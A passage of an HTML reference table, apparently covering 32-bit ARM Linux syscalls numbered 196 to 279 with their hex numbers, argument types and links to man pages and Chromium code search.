*statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">196</td><td>lstat64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lstat64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lstat64">cs/</a></td><td align="center">0xc4</td><td>const char *filename</td><td>struct stat64 *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">197</td><td>fstat64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fstat64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstat64">cs/</a></td><td align="center">0xc5</td><td>unsigned long fd</td><td>struct stat64 *statbuf</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">198</td><td>lchown32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lchown32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lchown32">cs/</a></td><td align="center">0xc6</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">199</td><td>getuid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getuid32">cs/</a></td><td align="center">0xc7</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">200</td><td>getgid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getgid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getgid32">cs/</a></td><td align="center">0xc8</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">201</td><td>geteuid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/geteuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*geteuid32">cs/</a></td><td align="center">0xc9</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">202</td><td>getegid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getegid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getegid32">cs/</a></td><td align="center">0xca</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">203</td><td>setreuid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setreuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setreuid32">cs/</a></td><td align="center">0xcb</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">204</td><td>setregid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setregid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setregid32">cs/</a></td><td align="center">0xcc</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">205</td><td>getgroups32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getgroups32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getgroups32">cs/</a></td><td align="center">0xcd</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">206</td><td>setgroups32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setgroups32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setgroups32">cs/</a></td><td align="center">0xce</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">207</td><td>fchown32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchown32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchown32">cs/</a></td><td align="center">0xcf</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">208</td><td>setresuid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setresuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setresuid32">cs/</a></td><td align="center">0xd0</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">209</td><td>getresuid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getresuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getresuid32">cs/</a></td><td align="center">0xd1</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">210</td><td>setresgid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setresgid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setresgid32">cs/</a></td><td align="center">0xd2</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">211</td><td>getresgid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getresgid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getresgid32">cs/</a></td><td align="center">0xd3</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">212</td><td>chown32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/chown32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*chown32">cs/</a></td><td align="center">0xd4</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">213</td><td>setuid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setuid32">cs/</a></td><td align="center">0xd5</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">214</td><td>setgid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setgid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setgid32">cs/</a></td><td align="center">0xd6</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">215</td><td>setfsuid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setfsuid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setfsuid32">cs/</a></td><td align="center">0xd7</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">216</td><td>setfsgid32</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setfsgid32.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setfsgid32">cs/</a></td><td align="center">0xd8</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">217</td><td>getdents64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getdents64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getdents64">cs/</a></td><td align="center">0xd9</td><td>unsigned int fd</td><td>struct linux_dirent64 *dirent</td><td>unsigned int count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">218</td><td>pivot_root</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pivot_root.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pivot_root">cs/</a></td><td align="center">0xda</td><td>const char *new_root</td><td>const char *put_old</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">219</td><td>mincore</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mincore.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mincore">cs/</a></td><td align="center">0xdb</td><td>unsigned long start</td><td>size_t len</td><td>unsigned char * vec</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">220</td><td>madvise</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/madvise.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*madvise">cs/</a></td><td align="center">0xdc</td><td>unsigned long start</td><td>size_t len</td><td>int behavior</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">221</td><td>fcntl64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fcntl64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fcntl64">cs/</a></td><td align="center">0xdd</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">222</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xde</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">223</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xdf</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">224</td><td>gettid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/gettid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*gettid">cs/</a></td><td align="center">0xe0</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">225</td><td>readahead</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/readahead.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readahead">cs/</a></td><td align="center">0xe1</td><td>int fd</td><td>loff_t offset</td><td>size_t count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">226</td><td>setxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setxattr">cs/</a></td><td align="center">0xe2</td><td>const char *path</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td>-</td></tr><tr><td align="center">227</td><td>lsetxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lsetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lsetxattr">cs/</a></td><td align="center">0xe3</td><td>const char *path</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td>-</td></tr><tr><td align="center">228</td><td>fsetxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fsetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fsetxattr">cs/</a></td><td align="center">0xe4</td><td>int fd</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td>-</td></tr><tr><td align="center">229</td><td>getxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getxattr">cs/</a></td><td align="center">0xe5</td><td>const char *path</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td>-</td><td>-</td></tr><tr><td align="center">230</td><td>lgetxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lgetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lgetxattr">cs/</a></td><td align="center">0xe6</td><td>const char *path</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td>-</td><td>-</td></tr><tr><td align="center">231</td><td>fgetxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fgetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fgetxattr">cs/</a></td><td align="center">0xe7</td><td>int fd</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td>-</td><td>-</td></tr><tr><td align="center">232</td><td>listxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/listxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*listxattr">cs/</a></td><td align="center">0xe8</td><td>const char *path</td><td>char *list</td><td>size_t size</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">233</td><td>llistxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/llistxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*llistxattr">cs/</a></td><td align="center">0xe9</td><td>const char *path</td><td>char *list</td><td>size_t size</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">234</td><td>flistxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/flistxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*flistxattr">cs/</a></td><td align="center">0xea</td><td>int fd</td><td>char *list</td><td>size_t size</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">235</td><td>removexattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/removexattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*removexattr">cs/</a></td><td align="center">0xeb</td><td>const char *path</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">236</td><td>lremovexattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lremovexattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lremovexattr">cs/</a></td><td align="center">0xec</td><td>const char *path</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">237</td><td>fremovexattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fremovexattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fremovexattr">cs/</a></td><td align="center">0xed</td><td>int fd</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">238</td><td>tkill</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/tkill.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*tkill">cs/</a></td><td align="center">0xee</td><td>pid_t pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">239</td><td>sendfile64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendfile64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendfile64">cs/</a></td><td align="center">0xef</td><td>int out_fd</td><td>int in_fd</td><td>loff_t *offset</td><td>size_t count</td><td>-</td><td>-</td></tr><tr><td align="center">240</td><td>futex</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/futex.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*futex">cs/</a></td><td align="center">0xf0</td><td>u32 *uaddr</td><td>int op</td><td>u32 val</td><td>struct __kernel_timespec *utime</td><td>u32 *uaddr2</td><td>u32 val3</td></tr><tr><td align="center">241</td><td>sched_setaffinity</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setaffinity.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setaffinity">cs/</a></td><td align="center">0xf1</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long *user_mask_ptr</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">242</td><td>sched_getaffinity</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getaffinity.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getaffinity">cs/</a></td><td align="center">0xf2</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long *user_mask_ptr</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">243</td><td>io_setup</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_setup.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_setup">cs/</a></td><td align="center">0xf3</td><td>unsigned nr_reqs</td><td>aio_context_t *ctx</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">244</td><td>io_destroy</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_destroy.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_destroy">cs/</a></td><td align="center">0xf4</td><td>aio_context_t ctx</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">245</td><td>io_getevents</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_getevents.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_getevents">cs/</a></td><td align="center">0xf5</td><td>aio_context_t ctx_id</td><td>long min_nr</td><td>long nr</td><td>struct io_event *events</td><td>struct __kernel_timespec *timeout</td><td>-</td></tr><tr><td align="center">246</td><td>io_submit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_submit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_submit">cs/</a></td><td align="center">0xf6</td><td>aio_context_t</td><td>long</td><td>struct iocb * *</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">247</td><td>io_cancel</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_cancel.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_cancel">cs/</a></td><td align="center">0xf7</td><td>aio_context_t ctx_id</td><td>struct iocb *iocb</td><td>struct io_event *result</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">248</td><td>exit_group</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/exit_group.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*exit_group">cs/</a></td><td align="center">0xf8</td><td>int error_code</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">249</td><td>lookup_dcookie</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lookup_dcookie.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lookup_dcookie">cs/</a></td><td align="center">0xf9</td><td>u64 cookie64</td><td>char *buf</td><td>size_t len</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">250</td><td>epoll_create</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_create">cs/</a></td><td align="center">0xfa</td><td>int size</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">251</td><td>epoll_ctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_ctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_ctl">cs/</a></td><td align="center">0xfb</td><td>int epfd</td><td>int op</td><td>int fd</td><td>struct epoll_event *event</td><td>-</td><td>-</td></tr><tr><td align="center">252</td><td>epoll_wait</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_wait.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_wait">cs/</a></td><td align="center">0xfc</td><td>int epfd</td><td>struct epoll_event *events</td><td>int maxevents</td><td>int timeout</td><td>-</td><td>-</td></tr><tr><td align="center">253</td><td>remap_file_pages</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/remap_file_pages.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*remap_file_pages">cs/</a></td><td align="center">0xfd</td><td>unsigned long start</td><td>unsigned long size</td><td>unsigned long prot</td><td>unsigned long pgoff</td><td>unsigned long flags</td><td>-</td></tr><tr><td align="center">254</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xfe</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">255</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xff</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">256</td><td>set_tid_address</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/set_tid_address.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*set_tid_address">cs/</a></td><td align="center">0x100</td><td>int *tidptr</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">257</td><td>timer_create</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_create">cs/</a></td><td align="center">0x101</td><td>clockid_t which_clock</td><td>struct sigevent *timer_event_spec</td><td>timer_t * created_timer_id</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">258</td><td>timer_settime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_settime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_settime">cs/</a></td><td align="center">0x102</td><td>timer_t timer_id</td><td>int flags</td><td>const struct __kernel_itimerspec *new_setting</td><td>struct __kernel_itimerspec *old_setting</td><td>-</td><td>-</td></tr><tr><td align="center">259</td><td>timer_gettime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_gettime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_gettime">cs/</a></td><td align="center">0x103</td><td>timer_t timer_id</td><td>struct __kernel_itimerspec *setting</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">260</td><td>timer_getoverrun</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_getoverrun.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_getoverrun">cs/</a></td><td align="center">0x104</td><td>timer_t timer_id</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">261</td><td>timer_delete</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_delete.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_delete">cs/</a></td><td align="center">0x105</td><td>timer_t timer_id</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">262</td><td>clock_settime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_settime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_settime">cs/</a></td><td align="center">0x106</td><td>clockid_t which_clock</td><td>const struct __kernel_timespec *tp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">263</td><td>clock_gettime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_gettime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_gettime">cs/</a></td><td align="center">0x107</td><td>clockid_t which_clock</td><td>struct __kernel_timespec *tp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">264</td><td>clock_getres</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_getres.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_getres">cs/</a></td><td align="center">0x108</td><td>clockid_t which_clock</td><td>struct __kernel_timespec *tp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">265</td><td>clock_nanosleep</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_nanosleep.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_nanosleep">cs/</a></td><td align="center">0x109</td><td>clockid_t which_clock</td><td>int flags</td><td>const struct __kernel_timespec *rqtp</td><td>struct __kernel_timespec *rmtp</td><td>-</td><td>-</td></tr><tr><td align="center">266</td><td>statfs64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/statfs64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*statfs64">cs/</a></td><td align="center">0x10a</td><td>const char *path</td><td>size_t sz</td><td>struct statfs64 *buf</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">267</td><td>fstatfs64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fstatfs64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstatfs64">cs/</a></td><td align="center">0x10b</td><td>unsigned int fd</td><td>size_t sz</td><td>struct statfs64 *buf</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">268</td><td>tgkill</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/tgkill.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*tgkill">cs/</a></td><td align="center">0x10c</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">269</td><td>utimes</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/utimes.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*utimes">cs/</a></td><td align="center">0x10d</td><td>char *filename</td><td>struct timeval *utimes</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">270</td><td>arm_fadvise64_64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/arm_fadvise64_64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*arm_fadvise64_64">cs/</a></td><td align="center">0x10e</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">271</td><td>pciconfig_iobase</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pciconfig_iobase.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pciconfig_iobase">cs/</a></td><td align="center">0x10f</td><td>long which</td><td>unsigned long bus</td><td>unsigned long devfn</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">272</td><td>pciconfig_read</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pciconfig_read.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pciconfig_read">cs/</a></td><td align="center">0x110</td><td>unsigned long bus</td><td>unsigned long dfn</td><td>unsigned long off</td><td>unsigned long len</td><td>void *buf</td><td>-</td></tr><tr><td align="center">273</td><td>pciconfig_write</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pciconfig_write.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pciconfig_write">cs/</a></td><td align="center">0x111</td><td>unsigned long bus</td><td>unsigned long dfn</td><td>unsigned long off</td><td>unsigned long len</td><td>void *buf</td><td>-</td></tr><tr><td align="center">274</td><td>mq_open</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_open.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_open">cs/</a></td><td align="center">0x112</td><td>const char *name</td><td>int oflag</td><td>umode_t mode</td><td>struct mq_attr *attr</td><td>-</td><td>-</td></tr><tr><td align="center">275</td><td>mq_unlink</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_unlink.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_unlink">cs/</a></td><td align="center">0x113</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">276</td><td>mq_timedsend</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_timedsend.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_timedsend">cs/</a></td><td align="center">0x114</td><td>mqd_t mqdes</td><td>const char *msg_ptr</td><td>size_t msg_len</td><td>unsigned int msg_prio</td><td>const struct __kernel_timespec *abs_timeout</td><td>-</td></tr><tr><td align="center">277</td><td>mq_timedreceive</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_timedreceive.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_timedreceive">cs/</a></td><td align="center">0x115</td><td>mqd_t mqdes</td><td>char *msg_ptr</td><td>size_t msg_len</td><td>unsigned int *msg_prio</td><td>const struct __kernel_timespec *abs_timeout</td><td>-</td></tr><tr><td align="center">278</td><td>mq_notify</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_notify.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_notify">cs/</a></td><td align="center">0x116</td><td>mqd_t mqdes</td><td>const struct sigevent *notification</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">279</td><td>mq_getsetattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_getsetattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_getsetattr">cs/</a></td><td align="center">0x117</td><td>mqd_t mqdes</td><td>const struct mq_attr *mqstat</td><td>struct mq_attr *omqstat</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">280</td><td>waitid</td><td align="center"><a 